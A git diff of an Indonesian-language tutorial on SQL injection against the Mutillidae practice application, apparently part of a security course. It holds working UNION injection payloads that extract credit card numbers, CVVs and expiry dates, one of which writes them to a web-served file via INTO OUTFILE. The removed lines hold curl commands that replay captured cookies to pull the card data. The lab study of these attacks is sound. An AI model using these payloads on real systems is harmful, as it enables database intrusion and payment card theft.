@@ -24,26 +24,7 @@ select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,
 \! cat /tmp/CCN.csv
 ```
 
-
-* **Step 3** : Pada bagian connection, klik tombol _Settings_. Setelah mengklik tombol _Settings_, maka akan muncul kotak dialog _Connection Settings_. Atur _Connection Settings_ sesuai gambar.  
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_06_35.png)
-
-* **Step 4** : Buka burpsuite, dengan cara pilih Applications --&gt; Web Application Analysis --&gt; burpsuite  
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_10_12.png)
-
-* **Step 5** : Pada saat burpsuite telah dibuka, maka akan ditanyakan tentang project. Klik tombol Next   
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_24_51.png)
-
-* **Step 6** : Setelah menekan tombol next, maka selanjutnya ada memilih konfigurasi burp. Pilih radio button User Burp defaults dan Klik Start Burp  
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_26_28.png)
-
-* **Step 7** : Setelah menekan tombol Start Burp, maka aplikasi Burp Suite sudah berjalan. Langkah selanjutnya adalah memastikan apakah port proxy pada Burp Suite adalah 8080, dengan cara memilih menu Proxy --&gt; Options  
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_31_58.png)
-
-* **Step 8** : Setelah memastikan port porxy 8080, maka selanjutnya adalah mematikan Intercept pada menu Proxy --&gt; Intercept.  
-  ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_16_34_07.png)
-
-### \# SQL Injection \(Union Example \#1\)
+### \# SQL Injection (Union with Curl)
 
 * **Step 1** : Buka halaman user info. Pilih sidebar. OWASP Top 10 --&gt; A1 - SQL Injection --&gt; SQLi - Extract Data --&gt; User Info
   ![](/assets/lesson-7/VirtualBox_kali_19_12_2017_03_01_34.png)
@@ -51,7 +32,12 @@ select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,
 * **Step 2** : Ubah ukuran text box username menjadi 100% menggunakan inspect element agar text box lebih panjang untuk menuliskan syntax SQL Injection.  
   ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_37_43.png)
 
-* **Step 3** : Masukkan syntax sql `' union select null --` pada text box name untuk perbocaan pertama melakukan sql injection dan tekan tombol _View Account Details_.  
+* **Step 3** : Masukkan operasi sql sebagai berikut
+```
+' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
+```
+Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`
+pada text box name untuk perbocaan pertama melakukan sql injection dan tekan tombol _View Account Details_.  
   ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_20_40_50.png)
 
 * **Step 4** : Setelah menekan tombol _View Account Details_, maka akan terjadi error query karena jumlah kolom dan kolom union berbeda.  
@@ -79,31 +65,3 @@ select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,
 
 * **Step 12** : Maka hasilnya, bagian username diisi oleh ccnnumber, password diisi oleh ccv, dan signature diisi oleh expiration.   
   ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_12_04.png)
-
-### \# Curl Action
-
-* **Step 1** : Buka Burp Suite dan cari log hasil sniffing pada **step 12** pada bagian SQL Injection \(Union Example \#1\), kemudian catat/copas raw header request.  
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_17_58.png)
-
-* **Step 2** : Copas Cookie pada hasil header dan masukkan pada file crack\_cookies.txt  
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_21_02.png)
-
-* **Step 3** : Jalankan perintah   
-  `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'`   
-  dan lihat hasilnya. Hasilnya adalah data hasil sql injection.  
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_23_28.png)
-
-### \# Perl Parser
-
-* **Step 1** : Download lesson8.pl pada link berikut [http://www.computersecuritystudent.com/SECURITY\_TOOLS/MUTILLIDAE/MUTILLIDAE\_2511/lesson8/lesson8.pl.TXT](/http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT)
-* **Step 2** : Ganti nama lesson8.pl.TXT menjadi lesson8.pl dan ubah permission menjadi `rwx------` atau 700.
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_39_29.png)
-* **Step 3** : Jalankan perintah 
-  `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username="  > lesson8.txt`
-* **Step 4** : Setelah menjalankan perintah tersebut maka hasil perintah pada **Step 3** disimpan pada file lesson8.txt.
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_42_37.png)
-* **Step 5** : Jalankan file lesson8.pl dan lihat hasilnya.
-  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_43_37.png)
-
-
-
